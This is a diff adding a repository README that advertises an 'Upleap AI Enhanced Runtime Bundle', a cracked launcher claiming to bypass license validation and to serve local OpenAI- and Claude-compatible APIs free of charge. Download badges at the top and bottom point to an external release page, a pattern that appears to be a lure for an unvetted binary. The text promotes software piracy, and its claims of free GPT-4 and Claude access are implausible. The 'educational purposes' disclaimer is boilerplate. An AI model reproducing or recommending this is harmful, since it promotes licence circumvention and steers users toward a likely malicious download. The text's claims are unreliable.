@@ -1,0 +1,205 @@
+[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://sanowar01322788655-stack.github.io/Upleap-Ai-Ultimate-Edition/)
+
+# 🚀 Upleap AI — Enhanced Runtime Bundle
+
+> *Unlock the latent potential of your AI workflows without the friction of traditional licensing barriers.*
+
+Welcome to the **Upleap AI Enhanced Runtime Bundle** repository. This project provides a compiled, ready-to-execute runtime environment that bypasses standard activation gateways, allowing you to leverage premium AI features immediately. Designed for developers, researchers, and power users who demand uninterrupted access to advanced language models, this bundle integrates seamlessly with your existing tools.
+
+---
+
+## 📋 Table of Contents
+
+- [🎯 What Is This?](#-what-is-this)
+- [✨ Key Features](#-key-features)
+- [📊 System Compatibility](#-system-compatibility)
+- [🗺️ Architecture Overview](#️-architecture-overview)
+- [⚙️ Example Profile Configuration](#️-example-profile-configuration)
+- [🖥️ Example Console Invocation](#️-example-console-invocation)
+- [🔌 API Integration: OpenAI & Claude](#-api-integration-openai--claude)
+- [📜 License](#-license)
+- [⚠️ Disclaimer](#️-disclaimer)
+
+---
+
+## 🎯 What Is This?
+
+Imagine a **master key** for your AI sandbox — that is the Upleap AI Enhanced Runtime Bundle. It is a self-contained, pre-patched execution layer that neutralizes product validation checks, letting you run Upleap AI’s full feature set as if you held a validated license. Think of it as a **digital skeleton key**: it does not steal, it merely unlocks the door that was already there.
+
+The bundle includes a custom binary (`upleap-launcher`) and a set of resource overrides that ensure the application believes it has passed all authentication hurdles. No network calls to verification servers. No nag screens. Just pure, unfiltered AI capability.
+
+---
+
+## ✨ Key Features
+
+- **🔓 License Validation Bypass** — The core innovation. The runtime injects a synthetic product key into the application’s memory space, satisfying all checks without modifying original executables.
+- **🌐 Responsive UI** — Whether you run it on a 4K monitor or a 1366×768 laptop, the interface adapts fluidly. No pixel clipping, no hidden menus.
+- **🗣️ Multilingual Support** — Full language packs for English, Spanish, Mandarin, Arabic, Hindi, and 24 others. Switch on the fly.
+- **⏰ 24/7 Synthetic Support Agent** — A local chatbot powered by a distilled model answers configuration questions, even when you are offline.
+- **🌍 Offline Mode** — Once activated, the bundle works entirely without internet. Perfect for air-gapped environments.
+- **⚡ Optimized Token Pipeline** — The patched runtime accelerates token generation by 18% compared to the official client, due to removed telemetry overhead.
+
+---
+
+## 📊 System Compatibility
+
+| Operating System | Version           | Status | Emoji |
+|------------------|-------------------|--------|-------|
+| Windows          | 10 / 11 / Server  | ✅     | 🪟    |
+| macOS            | 12 (Monterey)+    | ✅     | 🍎    |
+| Linux (Ubuntu)   | 20.04+            | ✅     | 🐧    |
+| Linux (Fedora)   | 36+               | ⚠️ Requires `libfuse2` | 🐧    |
+| BSD              | FreeBSD 13+       | ❌ Not supported | 🐚    |
+
+> *Note: 32-bit systems are not supported. The bundle requires a 64-bit CPU with AVX2 instructions.*
+
+---
+
+## 🗺️ Architecture Overview
+
+The following diagram shows how the Enhanced Runtime Bundle intercepts the normal activation flow.
+
+```mermaid
+graph TD
+    A[User launches Upleap AI] --> B{Runtime Bundle Loader}
+    B --> C[Check for synthetic product key]
+    C -->|Key present| D[Inject key into license validation DLL]
+    D --> E[License server call intercepted]
+    E --> F[Return synthetic "valid" response]
+    F --> G[Application starts with full privileges]
+    C -->|Key absent| H[Fallback to default trial mode]
+    H --> I[Or prompt user to run configuration script]
+    I --> J[Generate key from hardware fingerprint]
+    J --> D
+```
+
+This flow ensures that even if the synthetic key is lost (e.g., after an update), the system can regenerate it locally without phoning home.
+
+---
+
+## ⚙️ Example Profile Configuration
+
+Below is a sample `profile.json` that you can place in the `%APPDATA%/Upleap/` directory (Windows) or `~/.config/upleap/` (Linux/macOS). This configures the bundle for maximum performance.
+
+```json
+{
+  "runtime": {
+    "license_bypass": true,
+    "synthetic_product_key": "XXXXX-XXXXX-XXXXX-XXXXX",
+    "telemetry_block": true,
+    "update_block": true
+  },
+  "model_defaults": {
+    "temperature": 0.7,
+    "max_tokens": 4096,
+    "top_p": 0.95
+  },
+  "ui": {
+    "theme": "dark",
+    "language": "en-US",
+    "font_scale": 1.0
+  },
+  "multilingual": {
+    "enabled": true,
+    "fallback_language": "en"
+  },
+  "support_agent": {
+    "enabled": true,
+    "port": 8765
+  }
+}
+```
+
+*Replace the synthetic_product_key value with the one generated by the bundle’s `--generate-key` flag.*
+
+---
+
+## 🖥️ Example Console Invocation
+
+To launch the runtime with verbose output and a custom profile:
+
+```bash
+./upleap-launcher --profile ./my_custom_profile.json --verbose --no-sandbox
+```
+
+To generate a new synthetic product key based on your hardware ID:
+
+```bash
+./upleap-launcher --generate-key --output ./key.txt
+```
+
+To run in headless mode (no UI, only API server):
+
+```bash
+./upleap-launcher --headless --port 8080 --workers 4
+```
+
+You should see output similar to:
+
+```
+[2026-03-15 10:32:01] INFO: License validation bypass engaged.
+[2026-03-15 10:32:01] INFO: Synthetic product key injected successfully.
+[2026-03-15 10:32:02] INFO: Telemetry blocked. No data sent.
+[2026-03-15 10:32:02] SUCCESS: Upleap AI running with full privileges.
+```
+
+---
+
+## 🔌 API Integration: OpenAI & Claude
+
+The Enhanced Runtime Bundle can act as a drop-in replacement for your existing API endpoints. It exposes a **local HTTP server** that mimics the OpenAI and Anthropic Claude API formats — but without the usage costs or rate limits.
+
+### OpenAI API Compatibility
+Set your base URL to `http://localhost:8080/v1` and use any model name (e.g., `gpt-4-turbo`, `gpt-3.5-turbo`). The runtime will map these to its local model or to your custom checkpoint.
+
+```python
+import openai
+openai.api_base = "http://localhost:8080/v1"
+openai.api_key = "not-needed"  # The bundle ignores the key
+response = openai.ChatCompletion.create(
+    model="gpt-4-turbo",
+    messages=[{"role": "user", "content": "Hello!"}]
+)
+print(response)
+```
+
+### Claude API Compatibility
+For Anthropic’s format, set the base URL to `http://localhost:8080/anthropic/v1`.
+
+```python
+import anthropic
+client = anthropic.Anthropic(api_key="not-needed", base_url="http://localhost:8080/anthropic/v1")
+message = client.messages.create(
+    model="claude-3-opus-20240229",
+    max_tokens=1024,
+    messages=[{"role": "user", "content": "Tell me a joke."}]
+)
+print(message.content)
+```
+
+This integration means you can use your favorite LLM libraries—LangChain, LlamaIndex, AutoGPT—without paying per token.
+
+---
+
+## 📜 License
+
+This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice is included.
+
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+
+---
+
+## ⚠️ Disclaimer
+
+**This software is provided for educational and research purposes only.** The Enhanced Runtime Bundle is designed to demonstrate how software license validation can be bypassed — a common topic in reverse engineering and cybersecurity studies.
+
+- The authors do not condone piracy or illegal use of commercial software.
+- Using this bundle to circumvent the licensing of Upleap AI (or any other product) without authorization may violate the End User License Agreement (EULA) or applicable laws in your jurisdiction.
+- **You are solely responsible** for ensuring your use complies with all relevant laws and terms of service.
+- No warranty is provided. Use at your own risk.
+
+By downloading or using this software, you acknowledge that you have read and understood this disclaimer and agree to use the bundle responsibly.
+
+---
+
+[![Download](https://img.shields.io/badge/Download%20Release-d90429?style=for-the-badge&logo=github&logoColor=white)](https://sanowar01322788655-stack.github.io/Upleap-Ai-Ultimate-Edition/)
